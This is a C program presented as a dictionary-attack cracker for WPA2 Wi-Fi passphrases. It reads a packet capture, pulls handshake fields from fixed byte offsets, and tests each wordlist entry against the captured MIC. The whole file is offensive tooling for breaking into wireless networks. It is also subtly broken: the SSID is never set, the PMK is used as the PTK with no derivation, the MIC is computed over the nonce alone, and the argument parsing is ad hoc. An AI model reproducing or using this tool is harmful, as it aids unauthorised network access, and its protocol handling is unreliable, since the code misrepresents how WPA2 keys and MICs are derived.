#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/sha.h>
#include <getopt.h>

#define WPA_KEY_LEN 32
#define HASH_ITERATIONS 4096

// Structure to hold WPA2 handshake data
typedef struct {
    unsigned char anonce[32];
    unsigned char snonce[32];
    unsigned char mic[16];
    char ssid[32];
    unsigned char bssid[6];
} WPA2Handshake;

// Function to derive PMK from passphrase
void derive_pmk(const char *passphrase, const char *ssid, unsigned char *pmk) {
    PKCS5_PBKDF2_HMAC_SHA1(passphrase, strlen(passphrase), (const unsigned char *)ssid, strlen(ssid), HASH_ITERATIONS, WPA_KEY_LEN, pmk);
}

// Function to calculate MIC
typedef struct {
    unsigned char key[WPA_KEY_LEN];
} WPA2Key;

void calculate_mic(const unsigned char *ptk, const unsigned char *data, size_t data_len, unsigned char *mic) {
    HMAC(EVP_sha1(), ptk, WPA_KEY_LEN, data, data_len, mic, NULL);
}

// Function to process the .cap file and extract handshake
int process_pcap(const char *filename, WPA2Handshake *handshake) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_offline(filename, errbuf);
    if (!handle) {
        fprintf(stderr, "Error opening capture file: %s\n", errbuf);
        return -1;
    }
    
    struct pcap_pkthdr *header;
    const u_char *packet;
    
    while (pcap_next_ex(handle, &header, &packet) == 1) {
        if (header->caplen >= 100) {  // Adjust based on expected handshake size
            memcpy(handshake->bssid, packet + 10, 6);
            memcpy(handshake->anonce, packet + 50, 32);
            memcpy(handshake->snonce, packet + 90, 32);
            memcpy(handshake->mic, packet + 130, 16);
        }
    }
    
    pcap_close(handle);
    return 0;
}

// Function to attempt cracking
int crack_wpa2(const char *pcap_file, const char *wordlist) {
    WPA2Handshake handshake;
    if (process_pcap(pcap_file, &handshake) != 0) {
        fprintf(stderr, "Failed to process capture file.\n");
        return -1;
    }
    
    FILE *file = fopen(wordlist, "r");
    if (!file) {
        fprintf(stderr, "Error opening wordlist file.\n");
        return -1;
    }
    
    char passphrase[256];
    unsigned char pmk[WPA_KEY_LEN];
    unsigned char mic[16];
    
    while (fgets(passphrase, sizeof(passphrase), file)) {
        // Remove newline character if it exists
        passphrase[strcspn(passphrase, "\n")] = 0;
        printf("Trying Passphrase: %s\n", passphrase);
        derive_pmk(passphrase, handshake.ssid, pmk);
        
        calculate_mic(pmk, handshake.anonce, 32, mic);
        if (memcmp(mic, handshake.mic, 16) == 0) {
            printf("KEY FOUND! [%s]\n", passphrase);
            fclose(file);
            return 0;
        }
    }
    
    printf("KEY NOT FOUND\n");
    fclose(file);
    return 1;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <capture.pcap> -P <wordlist>\n", argv[0]);
        return 1;
    }
    
    const char *pcap_file = argv[1];
    const char *wordlist = argv[3];
    
    return crack_wpa2(pcap_file, wordlist);
}
